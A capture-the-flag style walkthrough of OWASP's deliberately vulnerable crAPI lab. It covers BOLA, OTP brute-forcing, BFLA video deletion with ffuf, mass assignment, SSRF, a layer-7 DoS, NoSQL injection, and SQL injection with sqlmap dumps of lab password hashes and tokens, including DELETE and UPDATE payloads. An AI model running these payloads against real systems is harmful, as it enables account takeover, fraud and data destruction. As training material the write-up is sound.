# crAPI - Completely Ridiculous API

## ABOUT
crAPI is a modern API, built on top of a microservices architecture, and vulnerable by design, released by OWASP, which will help you understand the 10-top most critical API security risks.<br>

## SETUP
The crAPI application will be installed in an Ubuntu 22.04.2 LTS (Jammy Jellyfish) server (IP 10.1.1.11). The ports exposed are 8005 (for the HTTP web site), 8006 (HTTPS site), and 8007 (Mail Hog email server). The red box will be a Kali Linux machine running on IP 10.1.1.22. 

![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/f2d78a12-68a3-4dbd-8abc-4dcd88a78e65)

In case you do not want to download and run crAPI locally, it is also hosted publicly and available to be attacked through the web here http://crapi.apisec.ai/login


The exercise has been solved using Burpsuite, Firefox and Ffuf.

## REFERENCES
http://crapi.apisec.ai/login<br>
https://github.com/OWASP/crAPI<br>
https://owasp.org/API-Security/editions/2023/en/0x11-t10/<br>
https://owasp.org/www-project-crapi/<br>
https://www.cloudflare.com/learning/ddos/what-is-layer-7<br>
https://www.radware.com/cyberpedia/application-security/http-flood<br>
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection<br>
https://www.postgresql.org/docs/current/index.html<br>

## BOLA (Broken Object Level Authorization)
### Challenge 1. Access details of another user’s vehicle
The aim is to disclose sensitive information about another user’s vehicle, keeping in mind that vehicle IDs are not sequential numbers, but UUIDs. We need to find an endpoint that receives a vehicle UUID and returns information about it.\
\
Sign up a new account with the following data:
* Username: test
* Email: test@test.com
* Number: 123456789
* Password: Password123!\
\
![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/4b3fe77e-6557-41d7-998e-17feb4733a3a)

After the signup process is finished, we can login with our recently created user. In the user dashboard click on "Add vehicle". The application asks for a VIN and a pincode in order to add a car. These can be obtained in an email received in the MailHog server (port 8007) during the the signup process.

![Untitled2](https://github.com/g1vi/AllTheWriteUps/assets/120142960/6ecb8577-eb91-4008-8ca2-69f03153b637)

Insert the VIN 7MOAK60QPBG686751 and the pincode 7630 to add a new vehicle. A message "Vehicle successfully added" is reported and the user is redirected to the dashboard, where the new vehicle is presented.\
\
Inspect the captured traffic with Burpsuite.

![Untitled3](https://github.com/g1vi/AllTheWriteUps/assets/120142960/60f8b75e-fa43-4690-bfa2-bf2a3115d63b)

The endpoint `/identity/api/v2/vehicle/vehicles` provides data about the added car. Notice the car UUID is `ee389276-4040-4960-8603-11c1c0560027`, not sequential, and we cannot guess them initially. A BOLA vulnerability is related to the unauthorized access to another user's car using the car UUID; however,since we cannot guess this UUID, we have to find another endpoint leaking the car identifiers.\
\
In the user dashboard click on "Community" and capture the traffic with Burpsuite. A user forum appears where the users of the application post their comments. The posts are requested by a GET request to endpoint `/community/api/v2/community/posts/recent`

![Untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/d0fe8390-0367-4e64-87ee-c9056d600b35)

In the HTTP response the endpoint provides data about all the users who have commented in the forum, icluding the car UUID assigned to each one.
* "nickname":"Robot","email":"robot001@example.com","vehicleid":"797a2957-6bf1-43d8-abfc-d02309aff5b4"
* "nickname":"Pogba","email":"pogba006@example.com","vehicleid":"f328043c-cf29-48f0-9ebb-4bac953b7ad9"
* "nickname":"Adam","email":"adam007@example.com","vehicleid":"9351b721-aa14-40ae-b23b-3d52c358b9f2"

Next step is to find an endpoint where we can request car details using the car UUID. Enumerating the website we discover if we request a car's location by clicking on the "Refresh location" button, a GET request is sent to endpoint `/identity/api/v2/vehicle/{{car id}}/location`. Refresh the location of our car, capture the traffic and send to repeater. Replacing our car UUID with any of the UUIDs previously discovered we can access the details of another user's car.

![Untitled5](https://github.com/g1vi/AllTheWriteUps/assets/120142960/9a9bd89a-41ff-4548-b3eb-dabeb2b015cc)

The application fails to verify user's authorization when requesting car details, and we can access anyone's car details just changing the car UUID.

### Challenge 2. Access mechanic reports of other users
In the user dashboard, click on "Contact mechanic" and fill in a service report. Inspect the traffic with Burpsuite.

![Untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/90c556ae-72c4-4cfa-a254-733408aef61d)

We see a POST request to endpoint `/workshop/api/mechanic/contact_mechanic`. The server assigns an `id=10` to the case in the response. In the previous challenge we discovered the application is vulnerable to BOLA, so let's check if we can access other mechanic cases by just changing the report id.\
\
Prepare in Burpsuite repeater a GET request to `/workshop/api/mechanic/mechanic_report?report_id=5`. Include your JWT in the header `Authorization: Bearer <JWT>`, otherwise an error will be reported ("JWT token required!").\
\
The application provides details about the mechanic report with `id=5` in the response .

![Untitled5](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b9bcb5fc-f35e-4361-9572-14fc6973d2d9)

In conclusion, the application fails to verify the user authorization when requesting access at the object level, such as mechanic report IDs or vehicle UUIDs, and the BOLA vulnerability is confirmed.

## BROKEN USER AUTHENTICATION
### Challenge 3. Reset the password of another user
When an user requests a password reset the application asks the user to enter an email address. First, let's try to reset our own password, after entering the email the application reports an OTP has been sent to our inbox. The mail inbox is available in the MAilHog server, where we notice the OTP is just a 4-digit code.

![Untitled6](https://github.com/g1vi/AllTheWriteUps/assets/120142960/23ea260d-4b2c-47f9-b2a8-17c6c864e1f6)

Next step is to try with one of the email addresses we have disclosed in the previous challenge, for example `adam007@example.com`. We enter this email in the password reset box and the application notifies an OTP has been sent to the user's inbox. Enter any OTP code in the box and let process fail, then inspect the traffic with Burpsuite.

![Untitled7](https://github.com/g1vi/AllTheWriteUps/assets/120142960/28f16d02-bbf4-4648-b020-494de8119092)

We see a POST request to endpoint `/identity/api/auth/v3/check-otp`. Since the OTP is just 4-digit, we can try to bruteforce it. This can be done with either `ffuf` or Burpsuite intruder.\
\
Right-click on the request and send to intruder, mark the OTP field with section signs § and load a wordlist. This wordlist must contain codes from 0000 to 9999, and can be generated with bash command `seq`. Then launch the attack and inspect the output.\
\
Unfortunately, shortly after the process is started the server begins responding with status code 503 and error message "You've exceeded the maximum number of attempts". It seems a countermeasure is in place to avoid bruteforce attacks.

![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/8d35b483-1082-4ddb-b7c6-05028ef0a3ac)

In principle, this prevents us from resetting the password of another user. However, if we inspect the endpoint, we see it is labeled `/v3`. Let's fuzz for older API versions which hopefully does not implement bruteforcing protections.\
\
Start querying with `curl` for API v1.
```bash
> curl -i -X POST http://10.1.1.11:8005/identity/api/auth/v1/check-otp \
-H 'Content-Type: application/json' \
-d '{"email":" adam007@example.com","otp":"1111","password":"Password123!"}'

HTTP/1.1 404 
Server: openresty/1.17.8.2
Date: Thu, 18 Jan 2024 16:15:01 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```
So API v1 does not exist. Let's try API v2.
```bash
> curl -i -X POST http://10.1.1.11:8005/identity/api/auth/v2/check-otp \
-H 'Content-Type: application/json' \
-d '{"email":" adam007@example.com","otp":"1111","password":"Password123!"}'

HTTP/1.1 500 
Server: openresty/1.17.8.2
Date: Thu, 18 Jan 2024 16:15:08 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

{"message":"Invalid OTP! Please try again..","status":500}
```
 We receive an "Invalid OTP" error message, so the API v2 exists. Let's try bruteforcing this endpoint.\
 \
Follow the same procedure as before, just change the API version in the intruder payload.

![Untitled9](https://github.com/g1vi/AllTheWriteUps/assets/120142960/c3d1f521-f88d-41f0-a89d-19be54ca52b0)

Then load the same wordlist payload as before and launch the attack. Indeed, the bruteforce protection is not in place in API v2, and a status 200 is reported for OTP 4043.

![Untitled10](https://github.com/g1vi/AllTheWriteUps/assets/120142960/d55d44aa-111e-4157-b0a4-bfc198e87976)

Finally, reset the user adam007@example.com password with OTP 4043 and verify you can login as this user with the new password `Password123!`

![Untitled11](https://github.com/g1vi/AllTheWriteUps/assets/120142960/852ad8e2-aaaf-4bdf-af7e-d247a8749353)

## EXCESSIVE DATA EXPOSURE
### Challenge 4. Find an endpoint that leaks sensitive information of other users
We have already found the endpoint leaking sensitive information in challenge 1. It is endpoint `/community/api/v2/community/posts/recent`, which leaks email and vehicle UUID of any user who post comments in the forum.

### Challenge 5. Find an endpoint that leaks an internal property of a video
Navigate to your profile dashboard and click on "Upload video". Add an `.mp4` file and click on "Upload", capture the traffic with Burpsuite and inspect the request.

![Untitled12](https://github.com/g1vi/AllTheWriteUps/assets/120142960/a0a75ad5-080a-4948-a294-05d36f88245f)

It seems the application leaks information about the video conversion process, along with the video name and the video ID.

## RATE LIMITING
### Challenge 6. Perform a layer 7 DOS using contact mechanic feature
Layer 7 attacks are attacks aimed at OSI layer 7 (application layer). You can find information about these kind of attacked here:\
https://www.cloudflare.com/learning/ddos/what-is-layer-7
\
https://www.radware.com/cyberpedia/application-security/http-flood
\

In short, an application layer attack overwhelms network or server resources with a flood of traffic, typically HTTP traffic. For example, sending thousands of requests per second for a certain webpage until the server is overwhelmed and cannot respond to all of them, or calling an API over and over until the service crashes.\
\
Create a new mechanic report and capture the traffic. It seems you can configure the request to be repeated if it fails as many times as you want. We will abuse this functionality by provoking a failed request (for exmaple, entering an incorrect VIN), then intercept the request and configure it so it is repeated 100 times.

![Untitled13](https://github.com/g1vi/AllTheWriteUps/assets/120142960/112c8c52-05c4-460c-bb73-606a1170f7eb)


Send the request and let if fail. The server will hang and send a status code 500 until the requests are processed. In theory, you could choose for how long you want the server to be unavailable by adjusting the number of repeats.

## BFLA (Broken Function Level Authorization)
### Challenge 7. Delete a video of another user
Once a video is uploaded into our profile, we can replace it, rename it or share it with the community. Let's rename our video and capture the traffic.

![Untitled14](https://github.com/g1vi/AllTheWriteUps/assets/120142960/c0d29ef5-e10c-4baa-a12f-267d80ce34c6)

It seems the video renaming is performed by means of a PUT request to the API endpoint `/identity/api/v2/user/videos/{{video_id}}`. If the application was vulnerable to BFLA we could delete the video just changing the request method. Let's try it first with our own video, send the captured request to repeater and change the request method to DELETE.

![Untitled15](https://github.com/g1vi/AllTheWriteUps/assets/120142960/4cc88dcf-cb20-471c-9377-811e2ffbe592)

The application returns an error indicating this method is reserved for admins, and suggests to try the admin API. We are not admin, but we can try to exploit the BFLA by guessing the admin endpoint, just replacing the word "user" with "admin".\
\
In this case, we verify that if we try the endpoint `/identity/api/v2/admin/videos/36` the video is successfully deleted.

![Untitled16](https://github.com/g1vi/AllTheWriteUps/assets/120142960/4543c75e-dbe2-4d46-8397-e90a50b9495c)

So we have discovered the admin endpoint to delete videos and confirmed the application is vulnerable to BFLA. To delete another user's video, we should send a DELETE request to `identity/api/v2/admin/videos/{{video_id}}`. Now the point is to find which is the ID of the videos uploaded by the other users. We will find out this with `ffuf`\
\
Right click on the DELETE request and save as `request.txt`. Open the file with a text editor and mark the video id field with the string "FUZZ".
```markdown
DELETE /identity/api/v2/admin/videos/FUZZ HTTP/1.1
Host: 10.1.1.11:8005
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.1.1.11:8005/my-profile
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDU1OTY0NDYsImV4cCI6MTcwNjIwMTI0Nn0.JR6Hew-AVOTfiIrj3BdMaa5jc2nlulq3Nd03UpDoRkCEDQ59HmfkmtUCvKBX_0q8p75AxMK4u_4_S9v-XonCH8yKbmZ-_Ifaqdah0atdKd8YlvmFPHSDVtqdWnRoFdrOh14O6ozVohFsLUewv-iv6mH7XY2rQQZnsNahM24s2CSXvW_xphiCBEd7CYnNTqVVokBfkg-IpI1nkT9H4SprwXh3dr0_pBR-gMIvGh-MElzIr00tIz1j9ddNZSE3PQVaPy54dGzFpQt4nQ2cmenW7afPViEl2jVmo0xqSrSXoEvFv04BhAAaMM754AdZsWn1yONJv75IzbpPIHDgP51Y9A
Origin: http://10.1.1.11:8005
Content-Length: 0
Connection: close
```
Now generate a wordlist with 100 ID's from 1 to 100.
```bash
seq 1 100 > seq
```
And fuzz with `ffuf`. A video with `id=31` is discovered and successfully deleted (status 200).
```bash
> ffuf -c -request request.txt -request-proto http -t 100 -mc 200 -w ./seq

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : DELETE
 :: URL              : http://10.1.1.11:8005/identity/api/v2/admin/videos/FUZZ
 :: Wordlist         : FUZZ: /home/kali/htb/seq
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Referer: http://10.1.1.11:8005/my-profile
 :: Header           : Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDU1OTY0NDYsImV4cCI6MTcwNjIwMTI0Nn0.JR6Hew-AVOTfiIrj3BdMaa5jc2nlulq3Nd03UpDoRkCEDQ59HmfkmtUCvKBX_0q8p75AxMK4u_4_S9v-XonCH8yKbmZ-_Ifaqdah0atdKd8YlvmFPHSDVtqdWnRoFdrOh14O6ozVohFsLUewv-iv6mH7XY2rQQZnsNahM24s2CSXvW_xphiCBEd7CYnNTqVVokBfkg-IpI1nkT9H4SprwXh3dr0_pBR-gMIvGh-MElzIr00tIz1j9ddNZSE3PQVaPy54dGzFpQt4nQ2cmenW7afPViEl2jVmo0xqSrSXoEvFv04BhAAaMM754AdZsWn1yONJv75IzbpPIHDgP51Y9A
 :: Header           : Origin: http://10.1.1.11:8005
 :: Header           : Connection: close
 :: Header           : Host: 10.1.1.11:8005
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept: */*
 :: Header           : Content-Type: application/json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200
________________________________________________

31                      [Status: 200, Size: 59, Words: 4, Lines: 1, Duration: 577ms]
:: Progress: [100/100] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
In summary, an application vulnerable to BFLA fails to verify user authorization when accessing elements at a function level. The attacker that exploits this vulnerability performs restricted actions just by changing the request method on a known endpoint, or by guessing the URL of restricted endpoints.

## MASS ASSIGNMENT
### Challenge 8. Get an item for free
The crAPI application allows users to return items they have ordered by simply clicking the "Return order" button, then a QR code is displayed which the client has to show in a USPS store. The shop orders have 3 status: "delivered", "return pending", or "returned". When an order is placed, the price is discounted from the user credit wallet. If the user clicks on "Return order", the order moves to status "return pending". Only when the the order is verified returned, the shop admin sets status to "returned", and the user automatically receives refund in his credit wallet.\
\
The goal is to move an order to status to "returned" without having previously requested a return, so we are automatically refunded while we keep the article.\
\
We start with a $50 credit wallet and place an order for a $10 seat. If we inspect the traffic with Burpsuite, after the order is placed, it is assigned order `id=12` and $10 credit is discounted from our wallet.

![Untitled17](https://github.com/g1vi/AllTheWriteUps/assets/120142960/edac1d44-f563-4a49-b60a-282bc24bc552)

Then the server redirects to endpoint `/workshop/api/shop/orders/all` where we see the `id=12` is in status "delivered", meaning we have already received the article. Now the point is to move the article to status "returned" without having returned it (i.e. without having clicked on "Return order"), so we are automatically refunded while keeping the article and thus having effectively got it for free.\
\
Let's try if we can access the order directly using the order ID in the endpoint.

![Untitled18](https://github.com/g1vi/AllTheWriteUps/assets/120142960/5da3cb3b-bfe7-40ac-9bc9-f9696d92f2ab)

In fact we can, and it seems we are also allowed to send PUT requests, so let's try to change the order to `"status":"returned"`

![Untitled19](https://github.com/g1vi/AllTheWriteUps/assets/120142960/d82d812b-29b9-4cbd-b383-e6ba8f14545b)

The server replies the change has been successfull applied. If we check our wallet we verify we have been refunded, and our wallet is again $50 credit as at the beginning.

![Untitled20](https://github.com/g1vi/AllTheWriteUps/assets/120142960/92bcc99e-db15-4181-b27d-4f1c618027e8)

Wrapping up, we have been able to change the order status so we are automatically refunded without having to return the article. Thus, we have got it for free.\
\
You may ask how we did know the accepted status to receive the refund was "returned". This can be discovered just putting any status you want in the PUT request, the application will kindly indicate which statuses are allowed.

![Untitled21](https://github.com/g1vi/AllTheWriteUps/assets/120142960/d2f8071c-20d9-40b2-9782-f6737ea3a040)

### Challenge 9. Increase your balance by $1,000 or more
Navigate to the application shop and browse the items, capture the traffic with Burpsuite.

![Untitled22](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b334049e-e750-438a-87a6-af51e6ebfff8)

It seems we are allowed to POST new items in the shop. Let's add a new item with a negative price of -$1000.

![Untitled23](https://github.com/g1vi/AllTheWriteUps/assets/120142960/843df8eb-3b99-4bf3-bb25-6434c7e893b7)

Now just place an order for this new product, your wallet will be charged -$1000 (this is, you will receive $1000).

![Untitled24](https://github.com/g1vi/AllTheWriteUps/assets/120142960/a9f7edcc-1ead-49b2-8473-8949242f27df)

### Challenge 10. Update internal video properties
We had finished challenge 5 uploading a video with `id=37` on endpoint `/identity/api/v2/user/videos`. Since we know the app is vulnerable to BOLA, we will try to access the video just sending a GET reques to this endpoint. Just adding the video ID we can access video properties individually.

![Untitled25](https://github.com/g1vi/AllTheWriteUps/assets/120142960/8cc8d399-f4d4-4fbb-bf22-397f8d0751bc)

Moreover, if we change the request method to OPTIONS, we see which actions are allowed on the endpoint.

![Untitled26](https://github.com/g1vi/AllTheWriteUps/assets/120142960/da55382b-7aa0-4eaf-bfee-effd26a54602)

It seems we are allowed to modify internal properties (PUT methods), such as the video name (as we did in the challenge 7) or the conversion parameters. Let's try to change the conversion parameters as `conversion_params=h.265`.

![Untitled27](https://github.com/g1vi/AllTheWriteUps/assets/120142960/5a35ed22-13ba-4b74-8cfa-dc1c775f9a57)

Using the API we have changed internal video parameters in such a way not accessible from the user dashboard.

## SSRF
### Challenge 11. Make crAPI send an HTTP call to "www.google.com" and return the HTTP response
For this we just need to find an endpoint which makes calls to web sites. Enumerating the application we find the `/workshop/api/merchant/contact mechanic` endpoint takes an argument `mechanic_api` which makes requests to HTTP sites.\
\
Just edit this argument, insert http://www.google.com, click on "Send", and let SSRF do its magic.

![Untitled28](https://github.com/g1vi/AllTheWriteUps/assets/120142960/ef9a7c38-3682-4973-9787-17c29a6c1f59)

## NoSQL INJECTION
### Challenge 12. Find a way to get free coupons without knowing the coupon code
Navigate to the shop and click on the "Add coupon" feature, capture the traffic and inspect the request, you see an injectable parameter called `coupon_code`.\
\
You can get a list of NoSQL injection payloads in the site https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection. For example, injecting the payload `"$ne":null` will make the application grant us a a $75 coupon code named `TRAC075`

![Untitled29](https://github.com/g1vi/AllTheWriteUps/assets/120142960/ed682a95-fcef-488f-acd3-bfa1d9c7c8c3)

## SQL INJECTION
## Challenge 13. Find a way to redeem a coupon that you have already claimed by modifying the database
In the previous challenge we have managed to discover a $75 coupon code `TRAC075`. We redeem the code by clicking on "Add coupon" and entering the code. Once the coupon is successfully applied, $75 credit is added to our wallet.

![Untitled30](https://github.com/g1vi/AllTheWriteUps/assets/120142960/6e2eb94b-af89-4944-aabb-312b26b360b7)

Now, if we try to redeem the same coupon code again we receive an error message.

![Untitled31](https://github.com/g1vi/AllTheWriteUps/assets/120142960/6e0b1fb1-a3f8-411a-ad6a-fe1527ee8c5b)

Let's focus on the `coupon_code` parameter. If we try several SQL injection payloads we are able to retrieve database information. For example, database version can be dumped with the following payload.
```bash
' union select version();-- -
```
And the response we retreive from the database.
```bash
`PostgreSQL 14.10 (Debian 14.10-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit`
```

![Untitled32](https://github.com/g1vi/AllTheWriteUps/assets/120142960/23a9fc57-7d10-4070-9614-e27da5b1119d)

So the database is PostgreSQL 14.10. We can also dump the database name.
```bash
' union select current_database();-- -
```

![Untitled33](https://github.com/g1vi/AllTheWriteUps/assets/120142960/724c84df-d3d5-45ff-978e-7f3d2fe7a04a)

And the current user.
```bash
' union select current_user;-- -
```

![Untitled34](https://github.com/g1vi/AllTheWriteUps/assets/120142960/ee630b72-a365-4e51-aeee-0cd8890bd419)

We could continue manually dumping the database, but to speed up the process we will use `sqlmap` to do the hard job. Right-click on the HTTP request and save it as `request.txt`. The file looks like this.
```bash
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: 10.1.1.11:8005
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: */* Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br 
Referer: http://10.1.1.11:8005/shop
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDU4NzQ1OTgsImV4cCI6MTcwNjQ3OTM5OH0.NZGJYnmy9KQNj8O1ZpHTzobLuXIxalOuDg883Ru6lcLDCwuTh8yJIIZXhdycZCixTytsT64q2dWbtuBKo2Ijw6Z8cNSh8hTXz6sGMZjmAZtiag2UE12nZN4ozQVovcdzyfXQ1exaGkOWrEvrz3GOh0zYJ0cJ0ZdJ4xCabR1kNMXLTvJy-kHQQ61e9smsgJaQvrQ4wWj5aSoCC3uKliJJ6tJjO-Cg_CcO7IfD07wkGEPt-wsS4tnDKnYJ1KMiT8TSCL2ibbJOIBvnhKu_cA5xneEGSSOGC-pi810eLf01aspi_PUdH6EBWd9sQHL4wkflOADeggnjGisVp2oG_Qhe1Q
Content-Length: 36
Origin: http://10.1.1.11:8005
Connection: close
Cookie: language=en; welcomebanner_status=dismiss

{
"coupon_code":"TRAC075",
"amount":75}
}
```
Then launch `sqlmap` passing the text request and the parameter to inject as arguments.
```bash
sqlmap -r request.txt --dbms=postgresql -p coupon_code --batch --level 5 --dump -tables
```
The tool returns 25 tables.
```bash
Database: public
[25 tables]
+----------------------------+
| order                      |
| applied_coupon             |
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
| health_check_db_testmodel  |
| mechanic                   |
| otp                        |
| otp_token                  |
| product                    |
| profile_video              |
| service_request            |
| user_details               |
| user_login                 |
| vehicle_company            |
| vehicle_details            |
| vehicle_location           |
| vehicle_model              |
+----------------------------+
```
Looks like the table we are looking for is called `applied_coupon`, let's dump its contents.
```bash
sqlmap -r request.txt --dbms=postgresql -p coupon_code --batch --level 5 --dump -T applied_coupon

Table: applied_coupon
[1 entry]
+----+---------+-------------+
| id | user_id | coupon_code |
+----+---------+-------------+
| 1  | 9       | TRAC075     |
+----+---------+-------------+
```
This contains the redeemed coupon code `TRAC075`, and the `id=9` of the user who has redeemed it (us). Although not strictly necessary for this challenge, we will also dump the `user_login` table for interesting stuff.
```bash
sqlmap -r request.txt --dbms=postgresql -p coupon_code --batch --level 5 --dump -T user_login
```
The table contains JWT tokens and blowfish password hashes.
```bash

| id | email | role | number | password | jwt_token | created_on |
| 1  | adam007@example.com  | 0 | 9876895423 | $2a$10$lZPBh5r.Yqqm/uM8ItZXDOFSyLTSX8jPKYTn0DBGHMXffHW9v/d2K | eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZGFtMDA3QGV4YW1wbGUuY29tIiwicm9sZSI6InByZWRlZmluZWQiLCJpYXQiOjE3MDU1OTYxMDEsImV4cCI6MTcwNjIwMDkwMX0.CeEaL0TF7aRIO4IEOV1QwcKuza4PQVEN5mae-62bKonSEIAqke-1iPhenAS1AXvQORtKbEPBiF9WaaOX0V6jrH8O-eeeTSkxh-EkpGQLvWaWf0GAt_k54g9fZZvOknohmMbfZIGeY4hQhO4kN_BEWS1H8XLgR3hOXvmlDdmVao5mKIUIAHvlTh9f-Mjej_x0DqTXsiyj-AHUE7kiKl8ywv595Hr29xfnRGyjGk-YJUrHCDP3Uyp7R6BUwDcaEvS5-_e3ZF3FuyuzVhFyM5-DcZzCf19tKsFluQ3YZj3GJGJVQehHZjheH9JO6OecFGCEdCeMOvpV9JJrFYBIgDCISg | 2024-01-01 |
| 2  | pogba006@example.com | 0      | 9876570006 | $2a$10$BVng80BxPNN68UChu2dmMeYBHCG1HQgmo8mrWwCiowkHAQk8O94EW | NULL                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | 2024-01-01 |
| 3  | robot001@example.com | 0      | 9876570001 | $2a$10$5Vh2uXr9wROsXt0i1LG4xeUXpcFsKSTHFQNid.UNF.kbipNLK3nQC | NULL                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | 2024-01-01 |
| 4  | test@example.com     | 1      | 9876540001 | $2a$10$TFgnRi4E7t5EqgQBWeXyluvYttS19S9nOG4irUdaFRuFQaRMqvJvS | NULL                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | 2024-01-01 |
| 5  | admin@example.com    | 3      | 9010203040 | $2a$10$36geKCVdDeAZw5ClyXTBC.8UGADBnTJ4jHj/Rjj7IBQSmp455WvF. | NULL                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | 2024-01-01 |
| 6  | jhon@example.com     | 2      | <blank>    | $2b$12$7tFzSvo8yk.CkfcUl6jtVOoECWihxNNaMUzOEfReAy1/7Tl0HofHm | NULL                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | 2024-01-01 |
| 7  | james@example.com    | 2      | <blank>    | $2b$12$Tu.2w/zmt5jnhupTE9vPB.8OnhzfAxajfAW9/cqWVQ7CAhjOjiilS | NULL                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | 2024-01-01 |
| 8  | aaa@aaa.com          | 1      | 1234567890 | $2a$10$RE8VrzrvYkN2KKQ5Iton..RIiMm2L/julKFo6cdt6jpysGTC9h3CS | eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhYWFAYWFhLmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzA1NTI5MTY2LCJleHAiOjE3MDYxMzM5NjZ9.VDmlO4v5uOCDFSw-H_fo7w2SWqGXf0GrG438zcrtSdytnEfOZq1NW5trEI32QTWqJvO38YiP3Ylw0WNwbmGzTq6j0z-UhtbDl5WQUWFAUNC1gqGe4SJvw1PYON59py6yJg_wI8XAcd5-hGb1scsOUfRNOPnQrQz0ncOFi-YjjR7b0D4pAT2yagj6yD7ezlyjeR7Qr50E5MiMICXty75arbYF_Do5WGkSa1bZsyIFSKNOT3hMW-JTnF5tWdgWBe2eG7R7FfDAMQTydqD57stm6ObkWQcgl6J35KBEB41a2afBoshz7dYckT9xZC3s7UUSfCfIB2uOUumjTfkw7Jo2BA                    | 2024-01-01 |
| 9  | test@test.com        | 1      | 123456789  | $2a$10$CnfFPnSWatvpPGFa58PCA.FdIVfVK24G1UhWzIDPczCbJSB7TpSCK | eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDU4NzQ4NzIsImV4cCI6MTcwNjQ3OTY3Mn0.HsaQqFy_4eyeX1uxqRdGvJHB4R6djyCXhYSFwSIaddvJLh5GbnaxHyxhIftzReiHjGcSi5J_E8ZHUfoLjTR7mtjdUSIPWkn_UQm_7AChrLHGW6C0NTGEZTJUjfcJ6qEYWZdHfVvi2ywY53-vBkrZNH-DxInHGVO0hyRr_T9pj-obUj2phYgJ6kRgyBej4-LHPHFrtnJZ3z5WZuBYw5dakh0EFWAsXiOun_uvI5_1pl-M8_VvtwDxC5R91OcQADkkPUAmSdLdjLcylMlMayIqmmOw8K2n5iNdmTrfIyoDSX_3AB_PHboLQ9ROkEegwhKizXdIjqEpb7IxBaDy7S3OEA                 | 2024-01-18 |
```
As we have said, the `applied_coupon` table contains a coupon code `TRAC075` which has already been redeemd by user `id=9`, which is our user. The challenge is asking us to modify the database using SQL injections so we can redeem the same coupon again. We could modify the database in several ways to meet the challenge, but probably the less noisy option would be to just delete the row associated to our user in the database.\
\
The payload for this injection would be.
```bash
'; delete from applied_coupon where user_id=9;-- -
```

![Untitled37](https://github.com/g1vi/AllTheWriteUps/assets/120142960/7a84fc2b-3a6e-46f3-809f-2b0359b06e8d)

Although the API replies with a 500 server error status, the command is successfully applied by PostgreSQL. The way the API replies depends on how the backend has been programmed to respond in each case, but it does not prevent the database to be updated.\
\
Let's verify the database has been successfully updated by trying to apply the coupon again.

![Untitled36](https://github.com/g1vi/AllTheWriteUps/assets/120142960/25cf37dc-d069-48b1-af31-a7602d3a8ed3)


![Untitled38](https://github.com/g1vi/AllTheWriteUps/assets/120142960/85d1c8bc-fb84-48ae-af88-c23b1dba4236)

We see the coupon is applied again, so we have successfully modified PostgreSQL by means of a SQL injection to reuse a coupon.\
\
Another way to modify the database could be to update the ID of the user who has redeemed the coupon. In this case the payload would be.
```bash
'; update applied_coupon set user_id=1 where user_id=9;-- -
```

